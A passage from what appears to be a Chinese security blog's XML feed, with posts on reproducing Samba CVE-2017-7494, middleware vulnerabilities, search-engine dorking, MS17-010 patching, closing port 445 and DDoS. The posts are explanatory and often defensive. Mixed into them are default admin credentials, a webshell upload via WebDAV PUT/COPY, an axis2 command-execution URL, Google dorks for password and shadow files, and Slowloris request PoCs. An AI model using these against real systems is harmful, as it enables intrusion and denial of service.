百年之后的雪夜，圣母双手抱着婴儿，来到秦三家门口，停顿片刻后将孩子放在了门外。几日之后，圣母化身为紫衣仙人，留下了一段话：元婴现世，几世情缘；百年浩劫，父为子亡。 后记如果你能坚持看完，那么你一定是个技术大牛。本篇小说是我写得最长的一篇短篇小说，构思花了很大的心思，虽然剧情比较老套，但是剧情我依然比较满意。]]></content>
      <categories>
        <category>诗意年华</category>
      </categories>
      <tags>
        <tag>原创小说</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Samba远程代码执行漏洞(CVE-2017-7494)]]></title>
    <url>../../../../../../../../2017/05/25/2/</url>
    <content type="text"><![CDATA[我自横刀向天笑 去留肝胆两昆仑 原本想复现一下CVE-2017-7494漏洞再分享出来的，没曾想过程一波三折，结果还铩羽而归。诶，还是在此记录一下失败的复现过程吧，为了纪念一下折腾不止的岁月，还有原谅我没有最终复现成功-！-。 关于此漏洞的介绍不用多说，可以移步Samba远程代码执行漏洞|Freebuf。Samba远程代码执行漏洞被业内称为linux版的永恒之蓝，危害可想而知。当然相比windows来说，linux下的445端口是默认关闭的，而有些版本的linux并没有自带samba软件，算是万幸。 漏洞影响版本Samba 3.5.0到4.6.4/4.5.10/4.4.14的中间版本。 漏洞利用条件 服务器打开了文件/打印机共享端口445 共享文件拥有访问以及写入权限 攻击者知道共享的目录路径 目前测试发现匿名登录与需要账号密码登录的情况都可以成功执行此漏洞，当然设置了账号密码的，在攻击时需要提供正确的账号密码。 漏洞利用原理攻击者可通过上传恶意的链接库文件（.so），使服务端程序加载并执行它，从而实现远程代码执行。 EXPMSF已经更新了此漏洞的利用模块，链接：is_known_pipename.rb另外国外大牛也用python写了个利用脚本（exp）：42060.py 复现的坑 想要复现此漏洞，首先得搭建一个靶机（不建议找公网的机子测试）。于是我找了台ubuntu服务器（14.04.1-Ubuntu），此版本默认安装了samba（Version 4.3.11-Ubuntu）省去了一些安装的麻烦，那么接下来就是要配置samba。首先创建一个目录用于共享1mkdir /home/share 然后设置权限（若不设置权限，用户将会没有写权限）1chmod 777 /home/share 最后修改samba配置文件：1vim /etc/samba/smb.conf 在文件最后添加一下内容：123456[myshare]comment=smb share testbrowseable=yes #可读writeable=yes #可写path=/home/share #设置目录（上一步创建的共享目录）public = yes #允许匿名登录 开启samba服务123/etc/init.d/smbd start #开启/etc/init.d/smbd stop #关闭/etc/init.d/smbd restart #重启 开启后，尝试远程访问一下：\\ip，经过测试我发现可以匿名登录，登录以后也有写权限。 靶机搭建完毕，接下来就开启MSF神器吧。 MAC10.11版本不支持最新版MSF 首先我在MAC上更新了msf，直接敲命令：msfupdate，没过多久更新成功了，于是我准备启动msf，输入命令：msfconsole，结果报错了（一脸懵逼，早知道就加载exploit文件就行了）。123456789101112131415161718dyld: lazy symbol binding failed: Symbol not found: _clock_gettime Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (which was built for Mac OS X 10.12) Expected in: /usr/lib/libSystem.B.dylibdyld: Symbol not found: _clock_gettime Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (which was built for Mac OS X 10.12) Expected in: /usr/lib/libSystem.B.dylib/opt/metasploit-framework/bin/msfdb: line 23: 4721 Trace/BPT trap: 5 ruby "$INSTALL_DIR/embedded/framework/msfdb" "$@"dyld: lazy symbol binding failed: Symbol not found: _clock_gettime Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (which was built for Mac OS X 10.12) Expected in: /usr/lib/libSystem.B.dylibdyld: Symbol not found: _clock_gettime Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (which was built for Mac OS X 10.12) Expected in: /usr/lib/libSystem.B.dylib/opt/metasploit-framework/bin/msfconsole: line 123: 4725 Trace/BPT trap: 5 $BIN/ruby $FRAMEWORK/$cmd $db_args "$@" 本人第一次碰见这个报错，于是只能上google查找解决方案，翻查一会在Github的Issues中发现了这个错误，错误原因是mac10.11版本不支持最新版的msf，需要将mac升级到10.12然后升级xcode。此时我的心情是崩溃的，首先我的是黑苹果，好不容易安装10.11成功了，想要突破到10.12谈何容易，其次msf已经被我升级了，怎么回退啊请问！ 注：其实不需要利用msfupdate更新msf，即使更新了也要自己加载exploit模块，因此只需要将is_known_pipename.rb文件放到msf的modules目录下即可。（当时sb了） Payload无法加载？ 舒缓心情后，继续折腾，那么既然mac上的msf不能用了，我就只能开一个虚拟机，好在之前虚拟机里面安装过kali，因此这回直接可以用了。打开kali后，我原本也想用msfupdate更新msf到最新版，但想想其实主要就是下载那个sabma漏洞的利用脚本。为了俭省时间，我直接去github上下载了is_known_pipename.rb，然后扔进了/usr/share/metasploit-framework/modules/exploits/linux/samba/目录下。然而当我运行msfconsole，加载is_known_pipename模块后，发现没有payload模块可以选择，因此攻击不能成功。 Session回连失败 事实证明当时是我打错了，应该不存在payload无法加载的问题。等我成功加载了此模块以及payload，也设置好参数了，可悲剧的事情又发生了，exploit实施攻击后，向靶机写入文件成功了，但是没有回链session。MSF参数设置：1234set rhost 172.16.1.2 set smb_share_base /home/nmask/share set payload generic/shell_reverse_tcpexploit Exploit后回显的部分信息：1Exploit completed,but no session was created 查看共享文件夹，已经成功生成.so文件： 靶机网络问题or匿名登录问题？ 起初我以为是匿名登录的原因，于是设置了samba账号密码，并且在msf上也设置了SMBPass与SMBUser。 靶机上配置修改配置文件123456[myshare]comment=smb share testbrowseable=yes #可读writeable=yes #可写path=/home/share #设置目录（上一步创建的共享目录）public = no #不允许匿名登录 在 [global] 设置选项中添加配置1security = user 命令行添加用户123useradd smbusersmbpasswd -a smbuser/etc/init.d/restart 注意以上添加的用户一定要是linux上存在的用户。 kali上配置12set SMBUser usernameset SMBPass password 然而最终session仍然没有成功创建，然后我怀疑是靶机无法直接连接虚拟机监听的端口，于是用nc进行了测试。虚拟机（kali）1nc -vv -l -p 4444 靶机(Ubuntu 64位)1nc 192.168.1.2 4444 最后的结果证明，靶机可以连通虚拟机的4444端口。 kali版本问题？ 最后在逛tools时发现有表哥说此exp只适合64位的kali，虽然我不明白这跟kali的版本有毛关系，但事实是我的kali是32位的并且我没有复现成功。为了验证这一说法，我特意安装了64位的kali，然后将is_konwn_pipename.rb文件放到msf模块目录下，然而最终的结果还是没有成功，因此这个说法是不成立的。如果真的是对系统版本有要求，那也应该对靶机的环境有要求。 也许搭了个假的靶机 那么我想最终原因就肯定出在我搭建的靶机上了，回顾过程，并没有发现有什么问题，而且权限也都是有的，毕竟共享文件夹下已经生成了.so文件。好吧，我暂时无能为力了，为了复现一个漏洞，我容易吗我!? 修复方案 打补丁 升级到Samba 4.6.4/4.5.10/4.4.14任意版本 在smb.conf的[global]板块中添加参数：nt pipe support = no 然后重启smbd服务。 复现成功的案例http://mp.weixin.qq.com/s/qWFe3yBg6NUU_kyVRiAzeA（复现了需要账号密码的情况）http://www.freebuf.com/vuls/135624.html]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>Samba漏洞</tag>
        <tag>CVE-2017-7494</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈中间件漏洞与防护]]></title>
    <url>../../../../../../../../2017/05/25/1/</url>
    <content type="text"><![CDATA[博观而约取，厚积而薄发 中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的。那么从实际情况来看，预防这种漏洞最大的难点，在于中间件安全该由谁负责？ 我们在处理应急响应事件时经常遇到这么一种情况，客户网站代码是外包的，也就是第三方公司负责开发，而部署可能是由客户内部运维人员负责。暂不说他们对于中间件安全的重视程度与了解程度，只谈发现漏洞后如何处理，便是一团乱。开发商推卸说这并不是代码上的问题，他们完全是按照安全开发流程（SDL）走的，所以跟他无关；运维人员就一脸蒙蔽了，反驳道：你们当初没跟我说要配置什么啊，只是让我安装个程序就ok了，我怎么知道？ 那么除此之外，开发人员以及运维人员对中间件安全意识的缺失也是一个重要因素，有些开发商可能会对自身代码进行安全检测，但只对代码部分进行审查是远远不够的。本篇用来记录总结一些常见的web中间件漏洞以及防护问题（记录的只是一部分，不代表全部），内容一部分摘自道哥的《白帽子讲web安全》一书，算做读书笔记亦或者读后感。 中间件、容器、服务器傻傻分不清？ 在谈中间件安全问题时，我觉得有必要先梳理下以上几种关系以及概念。当初我在接触这些概念时，脑子里就是一团浆糊，中间件、容器、服务器、webserver等等概念感觉彼此很相似，但又有所区别。因此在书写本篇时，我特意翻查了一些资料，试图梳理清这几者之间的关系，参考了文章：http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html 基础概念与作用这里只介绍web中间件、web服务器、web容器，因为除了web以外，其概念还可以扩展为数据库等。 web服务器web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动态请求委托其它程序（中间件程序）等。 web中间件web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。 web容器web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。 所属的类别web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。web容器：JSP容器、SERVLET容器、ASP容器等。 注意：web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。 重点分析 web服务器只是提供静态网页解析（如apache），或者提供跳转的这么一种服务。而web中间件（其包含web容器）可以解析动态语言，比如tomcat可以解析jsp（因为tomcat含有jsp容器），当然它也可以解析静态资源，因此它既是web中间件也是web服务器。不过tomcat解析静态资源的速度不如apache，因此常常两者结合使用。 Tomcat漏洞与防护 tomcat是apache的一个中间件软件，其可以提供jsp或者php的解析服务，为了方便远程管理与部署，安装完tomcat以后默认会有一个管理页面，管理员只需要远程上传一个WAR格式的文件，便可以将内容发布到网站，这一功能方便了管理员的同时也给黑客打开了方便之门，除此之外，tomcat还有一些样本页面，如果处理不当也会导致安全问题。 tomcat远程部署漏洞详情tomcat管理地址通常是：1Http://localhost:8080/manager 默认账号密码：1234root/roottomcat/tomcat admin adminadmin 123456 tomcat口令爆破 在默认不对tomcat做任何配置的时候爆破是无效的，而如果设置了账号密码就可以进行爆破。Tomcat的认证比较弱，Base64(用户名:密码)编码，请求响应码如果不是401（未经授权：访问由于凭据无效被拒绝。）即表示登录成功。登录成功后，可直接上传war文件，getshell（当然上传war文件需要manager权限） getshell过程首先将我们的.jsp shell文件打包为war文件：1jar -cvf shell.war shell.jsp 登录管理页面后，选择上传war文件。截图中间的目录便是上传成功以后的木马文件，可以点击浏览。直接在当前目录下访问shell.jsp。 Session Example样本页面默认地址：1http://localhost/servlets-examples/servlet/SessionExample 用来设置任意会话变量，恶意使用可对应用程序造成破坏。 tomcat漏洞防护 升级tomcat版本 删除远程部署页面，或者限定页面的访问权限。 找到/conf/tomcat-users.xml修改用户名密码以及权限。 删除样例页面文件 JBoss漏洞与防护JBoss这是一个基于JavaEE的应用服务器，与tomcat类似的是jboss也有远程部署平台，但不需要登陆。漏洞利用过程与tomcat类似，因此不再截图说明。除了远程部署漏洞外，jboss还存在反序列化漏洞，这里不再详述。 JBoss远程部署漏洞详情默认管理后台地址：1http://localhost:8080 getshell过程 访问管理页面，查看jboss配置页面中的JMX Console，这是JBoss的管理台程序，进入后找到Jboss.deployment包，该包下有flavor=URL.type=DeploymentSccanner选项。进入部署页面后便可以上传war文件，但与tomcat不同的是它不是本地上传war文件，而是从远程地址下载，因此需要自己准备一个文件服务器，用于远程下载war到目标jboss服务器上。具体方法是在部署页面找到”ADDURL”方法，输入URL地址，点击invoke。除了以上方法外，JMX-Console提供的BSH方法，同样也可以部署war包。 JBoss漏洞防护 开启jmx-console密码认证 删除jmx-console.war与web-console.war WebLogic漏洞与防护weblogic是一个基于JavaEE构架的中间件，安装完weblogic默认会监听7001端口。漏洞利用过程与tomcat类似，因此不再截图说明。 Weblogic远程部署漏洞详情默认后台地址：1http://localhost:7001/console/login/loginForm.jsp 账号密码： 用户名密码均为：weblogic 用户名密码均为：system 用户名密码均为：portaladmin 用户名密码均为：guest getshell过程成功登陆weblogic后台后，找到部署按钮，点击后选择安装，然后可以选择本地上传war包也可以利用远程url下载，部署完成后，weblogic会给出文件地址。 Weblogic漏洞防护 删除远程部署页面 axis2漏洞与防护axis2也是apache的一个项目，是新一代的SOAP引擎，其存在一个任意命令执行漏洞。（该漏洞来自补天平台） axis2命令执行漏洞详情默认后台地址：1http://localhost/axis2-admin/ 默认账号密码：admin与axis2登录后效果如下：执行系统命令poc1http://localhost/services/Axis2Shell/execCmd?cmd=whoami IIS漏洞与防护 IIS是微软的一款web服务器，其配置不当容易产生webdav漏洞。webdav本身是iis的一项扩展功能，开启后可以使用除了get、post以外的一些请求类型，比如put等。但如果配置不当，就会导致文件上传漏洞。除了webdav漏洞，近期还爆出了一个远程命令执行漏洞，具体移步：IIS6.0远程命令执行漏洞(CVE-2017-7269) IIS Webdav漏洞详情 当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。12OPTIONS / HTTP/1.1Host:thief.one 如果存在PUT方法，则可以尝试写入一个txt文件。12345PUT /shell.txt HTTP/1.1HOST:thief.oneContent-length:30&lt;%eval request("nmask")%&gt; 若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。通过MOVE或COPY方法改文件后缀名。123COPY /shell.txt HTTP/1.1HOST:thief.oneDestination:http://thief.one/shell.asp IIS漏洞防护 关闭webdav功能 Apache漏洞与防护 Apache本身也存在一些漏洞，比如slowhttp漏洞，当然官方认为其是apache的特性而不算是一种漏洞，然而事实证明它的危害真的很大。除了slowhttp漏洞以外，其第三方moudle存在很多反序列化或者远程命令执行的漏洞。 Apache slowhttp漏洞详情关于slowhttp漏洞请移步：浅谈DDOS攻击与防御 HPP漏洞HPP漏洞是web容器处理http参数时的问题，前面几款web服务器都或多或少存在这样的问题。1234&lt;?php $str=$_REQUEST['str']; #$_REQUEST[]函数可以接受GET/POST。 Echo $str;?&gt; 比如访问URL:1http://www.xxx.com/index.php?str=hello 此时页面显示hello但如果访问:1http://www.xxx.com/index.php?str=hello&amp;str=world&amp;str=nmask 此时页面显示nmask，把前面参数的值给覆盖了，这就是http参数污染。 利用场景绕过WAF，如：1PHP:index.php?str=1&amp;str=select * from admin -- 因为WAF可能会校验值的第一个单词，如果为select则触发，这样子可以避免被触发。 传送门除了以上这些漏洞以外，web服务器还有着一些解析动态语言时存在的漏洞，移步：服务器解析漏洞 | nMask’Blog]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>中间件漏洞</tag>
        <tag>中间件安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透神器系列】搜索引擎]]></title>
    <url>../../../../../../../../2017/05/19/1/</url>
    <content type="text"><![CDATA[动动指尖，弹指一挥间 搜索引擎是我日常工作中用得最多的一款工具，国内常用的搜索引擎包括Baidu，sougou，bing等。但我本篇要纪录的并不是这些常用的搜索引擎，而是信息安全从业人员必备的几款网络搜索引擎。本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。对搜索引擎语法有所遗忘的，本文可当参考，仅此而已 Google搜索引擎 这里之所以要介绍google搜索引擎，是因为它有别于百度、搜狗等内容搜索引擎，其在安全界有着非同一般的地位，甚至专门有一名词为google hacking用来形容google与安全非同寻常的关系。 google基本语法Index of/ 使用它可以直接进入网站首页下的所有文件和文件夹中。intext: 将返回所有在网页正文部分包含关键词的网页。intitle: 将返回所有网页标题中包含关键词的网页。cache: 搜索google里关于某些内容的缓存。define: 搜索某个词语的定义。filetype: 搜索指定的文件类型，如：.bak，.mdb，.inc等。info: 查找指定站点的一些基本信息。inurl: 搜索我们指定的字符是否存在于URL中。Link: link:thief.one可以返回所有和thief.one做了链接的URL。site: site:thief.one将返回所有和这个站有关的URL。 + 把google可能忽略的字列如查询范围。- 把某个字忽略，例子：新加 -坡。~ 同意词。. 单一的通配符。* 通配符，可代表多个字母。“” 精确查询。 搜索不同国家网站12inurl:tw 台湾inurl:jp 日本 利用google暴库利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下：123456789101112131415inurl:editor/db/ inurl:eWebEditor/db/ inurl:bbs/data/ inurl:databackup/ inurl:blog/data/ inurl:\boke\data inurl:bbs/database/ inurl:conn.asp inc/conn.aspServer.mapPath(“.mdb”)allinurl:bbs datafiletype:mdb inurl:databasefiletype:inc conninurl:data filetype:mdbintitle:"index of" data 利用goole搜索敏感信息利用google可以搜索一些网站的敏感信息，语法如下:1234567891011intitle:"index of" etcintitle:"Index of" .sh_historyintitle:"Index of" .bash_historyintitle:"index of" passwdintitle:"index of" people.lstintitle:"index of" pwd.dbintitle:"index of" etc/shadowintitle:"index of" spwdintitle:"index of" master.passwdintitle:"index of" htpasswdinurl:service.pwd 利用google搜索C段服务器信息此技巧来自lostwolf1site:218.87.21.* 可通过google可获取218.87.21.0/24网络的服务信息。 shodan搜索引擎shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。地址：https://www.shodan.io/ 搜索语法 hostname： 搜索指定的主机或域名，例如 hostname:”google” port： 搜索指定的端口或服务，例如 port:”21” country： 搜索指定的国家，例如 country:”CN” city： 搜索指定的城市，例如 city:”Hefei” org： 搜索指定的组织或公司，例如 org:”google” isp： 搜索指定的ISP供应商，例如 isp:”China Telecom” product： 搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version： 搜索指定的软件版本，例如 version:”1.6.2” geo： 搜索指定的地理位置，例如 geo:”31.8639, 117.2808” before/after： 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15” net： 搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” 以上内容参考：http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/ censys搜索引擎censys搜索引擎功能与shodan类似，以下几个文档信息。地址：https://www.censys.io/1234https://www.censys.io/certificates/help 帮助文档https://www.censys.io/ipv4?q= ip查询https://www.censys.io/domain?q= 域名查询https://www.censys.io/certificates?q= 证书查询 搜索语法默认情况下censys支持全文检索。 23.0.0.0/8 or 8.8.8.0/24 可以使用and or not 80.http.get.status_code: 200 指定状态 80.http.get.status_code:[200 TO 300] 200-300之间的状态码 location.country_code: DE 国家 protocols: (“23/telnet” or “21/ftp”) 协议 tags: scada 标签 80.http.get.headers.server：nginx 服务器类型版本 autonomous_system.description: University 系统描述 正则 钟馗之眼钟馗之眼搜索引擎偏向web应用层面的搜索。地址：https://www.zoomeye.org/ 搜索语法 app:nginx 组件名 ver:1.0 版本 os:windows 操作系统 country:”China” 国家 city:”hangzhou” 城市 port:80 端口 hostname:google 主机名 site:thief.one 网站域名 desc:nmask 描述 keywords:nmask’blog 关键词 service:ftp 服务类型 ip:8.8.8.8 ip地址 cidr:8.8.8.8/24 ip地址段 FoFa搜索引擎FoFa搜索引擎偏向资产搜索。地址：https://fofa.so 搜索语法 title=”abc” 从标题中搜索abc。例：标题中有北京的网站。 header=”abc” 从http头中搜索abc。例：jboss服务器。 body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。 domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。 host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。 port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。 ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。 protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。 city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。 region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。 country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。 cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。 高级搜索： title=”powered by” &amp;&amp; title!=discuz title!=”powered by” &amp;&amp; body=discuz ( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn” Dnsdb搜索引擎dnsdb搜索引擎是一款针对dbs解析的查询平台。地址：https://www.dnsdb.io/ 搜索语法DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户. 域名查询条件域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.例如查询google.com 的所有DNS记录: domain:google.com.域名查询可以省略domain:. 主机查询条件查询语法:host:例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值 按DNS记录类型查询查询语法: type:.例如只查询A记录: type:a使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法 按IP限制查询语法: ip:查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效查询指定IP范围: ip:8.8.8.8-8.8.255.255CIDR: ip:8.8.0.0/24IP最大范围限制65536个 条件组合查询的例子查询google.com的所有A记录: google.com type:a 本文将会持续补充一些内容…… 传送门【渗透神器系列】nc【渗透神器系列】nmap【渗透神器系列】Fiddler【渗透神器系列】WireShark]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>渗透神器</tag>
        <tag>shodan</tag>
        <tag>censys</tag>
        <tag>钟馗之眼</tag>
        <tag>google</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows系统打MS17-010补丁]]></title>
    <url>../../../../../../../../2017/05/15/1/</url>
    <content type="text"><![CDATA[你转身的一瞬，我萧条的一生 周一大早全民开始打补丁，由此可见此次蠕虫病毒影响空前绝后。而我在给自己电脑打补丁的时候，发现了一些问题，在此分享以帮助还未及时打补丁的朋友。 传送门需要关闭445端口的朋友可以参考教程: windows关闭445端口 微软漏洞信息官网挂了？ 今早我在访问 微软漏洞信息官方网站 准备下载补丁时，发现其网站出现502错误，不知道是不是由于访问量太高的缘由。我猜想此时微软高层的心情肯定是苦笑不得，从来没有被民众重视过的微软补丁在今日达到了一个下载高潮。由于官方渠道下载受阻，很多人无法得到补丁文件，从而没能顺利得安装好补丁，在此我给出网盘链接，里面是各个操作系统对应的补丁程序。 百度网盘链接：http://pan.baidu.com/s/1slfitD7 密码：dkoe 说明：网盘内每个操作系统对应一个压缩包，请下载后自行解压安装即可，如失效请留言告知！ 开启windows自动更新就ok了？ 起初我在处理ms17-010补丁的时候，是选择开启windows自动更新功能，并且安装了最新的一些补丁。然而当我安装完后进行查看时，并没有发现KB4012212(windows7)补丁信息。无奈，只能自行下载ms17-010补丁安装包进行单独安装，安装完以后可以看到已安装的补丁中存在了KB4012212，所以我猜想自动更新是不包含ms17-010漏洞补丁的。 如何查看已安装补丁信息？查看已安装的补丁信息(cmd下输入以下命令)： 方案一：1systeminfo | findstr "KB4012212" 如果有输出内容，说明打补丁成功；否则说明该补丁没有被成功安装。 方案二：1systeminfo &gt; systeminfo.txt 打开生成的systeminfo.txt文件查看，里面包含了已安装补丁的KB编号信息。 ms17-010对应的KB编号各版本操作系统对应的KB号： windows Vista （KB4012598） windows xp（KB4012598） Windows Server 2008（KB4012598） Windows 7（KB4012212、KB4012215） Windows Server 2008 R2（KB4012212、KB4012215） Windows 8.1（KB4012213、KB4012216） Windows Server 2012 and Windows Server 2012 R2（KB4012213、KB4012214、KB4012216、KB4012217） Windows RT 8.1（KB4012216） Windows 10（KB4012216、KB4013198） Windows Server 2016（KB4013198） 安装完补丁后，请查看校验系统是否存在对应的KB号。 MS对应的KB号请移步项目：https://github.com/tengzhangchao/microsoftSpider]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>ms17-010</tag>
        <tag>windows补丁</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows关闭445端口]]></title>
    <url>../../../../../../../../2017/05/13/2/</url>
    <content type="text"><![CDATA[一二三四五，上山打老虎 由于大规模蠕虫来袭，目前最紧急的事情就是关闭windows445端口，在此分享下windows关闭445端口的几种方案，适用于window2003/xp/windows7/windows8/windows10系统。 传送门需要打ms17-010系统补丁的朋友可以参考教程: windows系统打MS17-010补丁 修改注册表法为注册表添加一个键值，具体步骤： 单击”开始”，”运行”，输入”regedit”打开注册表。 找到注册表项”HKEY_LOCAL_MACHINE\System\Controlset\Services\NetBT\Parameters” 选择”Parameters”右键新建”DWORD值” 将DWORD值重命名为”SMBDeviceEnabled” 右键单击”SMBDeviceEnabled”选择”修改”,在”数值数据”下，输入”0” 键具体内容如下：12345Hive: HKEY_LOCAL_MACHINEKey: System\CurrentControlSet\Services\NetBT\ParametersName: SMBDeviceEnabledType: REG_DWORDValue: 0 修改完注册表后重启计算机，然后CMD运行”netstat -an | findstr 445”查看445端口是否关闭。 配置防火墙此方法不在于关闭自身445端口，而是为了阻断外界对本机445端口的连接访问。 防火墙高级设置—入站规则—右击新建规则—在对话框中选择UDP，端口号写上445—阻止链接。 新建完规则查看如下： 关闭server服务以管理员身份打开cmd，运行1net stop server 配置需要重新计算机生效，因为共享服务需要开启server，因此关闭server服务就不能使用共享服务（445端口服务）。 网卡设置禁止Windows共享卸载下图两个组件，此操作的目的是禁止445端口。 禁止netbios服务此操作的目的是禁止137,139端口，关闭netbios服务。 以上2步操作需要重启计算机生效。 修改本地组策略 运行输入gpedit.msc打开本地组策略编辑器，计算机配置–windows设置–安全设置–ip安全策略，在本地计算机。通过修改本地组策略方式虽然比较麻烦，但是比较推荐此方法。具体操作可参考：https://jingyan.baidu.com/article/d621e8da0abd192865913f1f.html]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>445端口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈DDos攻击与防御]]></title>
    <url>../../../../../../../../2017/05/10/1/</url>
    <content type="text"><![CDATA[水能载舟，亦能覆舟 最近重新拜读了道哥的经典力作《白帽子讲Web安全》一书，发觉好书看一遍是不够的，每次品味都有不同的味道。道哥此书侧重于企业安全，即所讲所写偏重企业内部的安全建设，而不是针对某些漏洞大书特书。再次细读，深感需要做点笔记加强加强记忆，于是便以本篇开始，记录一些曾经看过的经典书籍的笔记。本篇主要用于记录《白帽子讲Web安全》读后感之DDos攻击与防御相关的知识。本篇记录的绝大部分内容来自《白帽子讲Web安全》，感谢道哥！ DDos简介 DDos又叫分布式拒绝服务，全称Distributed Denial of Service，利用DDos造成的攻击称为拒绝服务攻击，其原理就是利用大量的请求造成资源过载，导致服务不可用。 DDos攻击从层次上可分为网络层攻击与应用层攻击，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用。 网络层DDos攻击网络层DDos攻击包括SYN flood、UDP flood、ICMP flood等。 SYN flood攻击 SYN flood攻击主要利用了TCP三次握手过程中的bug，我们知道TCP三次握手过程是要建立连接的双方发送SYN，SYN+ACK，ACK数据包，而当攻击方随意构造源ip去发送SYN包时，服务器返回的SYN+ACK就不能得到应答（因为ip是随意构造的），此时服务器就会尝试重新发送，并且会有至少30s的等待时间，导致资源饱和服务不可用，此攻击属于慢型dos攻击。 UDP flood攻击 由于udp是一种无连接的协议，因此攻击者可以伪造大量的源IP地址去发送udp包，此种攻击属于大流量攻击。正常应用情况下，UDP包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源。 ICMP flood攻击 此攻击属于大流量攻击，其原理就是不断发送不正常的ICMP包（所谓不正常就是ICMP包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。并且目前很多服务器都是禁ping的（在防火墙在可以屏蔽icmp包），因此这种方式已经落伍。 网络层DDos防御 网络架构上做好优化，采用负载均衡分流。 添加抗DDos设备，流量清洗。 限制单ip请求频率。 防火墙等防护设置禁止icmp包等 网络层的DDos攻击究其本质其实是无法防御的，我们能做得就是不断优化自身的网络架构，以及提升网络带宽。 应用层DDos攻击应用层DDos攻击不是发生在网络层，是发生在TCP建立握手成功之后，应用程序处理请求的时候。 CC攻击 CC攻击还有一段比较有趣的来历，据说当时绿盟为了防御DDos攻击研发了一款产品，叫做“Collapasar”，能够有效的防御SYN flood攻击。然而黑客为了挑衅，研发了一款Challenge Collapasar工具（简称CC）。 CC攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送CC攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过cc攻击，使用爬虫对某些加载需要消耗大量资源的页面发起http请求。 slowloris 这是由于webserver中间件漏洞引发的拒绝服务攻击，其原理是以极低的速度往服务器发送HTTP请求。apache等中间件默认会设置最大并发链接数，而这种攻击就是会持续保持连接，导致服务饱和不可用。slowloris有点类似基于HTTP协议的SYN flood攻击。 poc构造以下畸形http请求包1234GET / HTTP/1.1\r\nHost: Victim host\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n 完整的http请求头结尾应该是两次的\r\n\r\n，这里少了一次，因此服务器将会一直等待。 HTTP POST DOS 其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以极低的速度发包，保持连接不断，导致服务饱和不可用。 poc构造以下畸形http请求包1234GET / HTTP/1.1\r\nHost: Victim host\r\nUser-Agent: 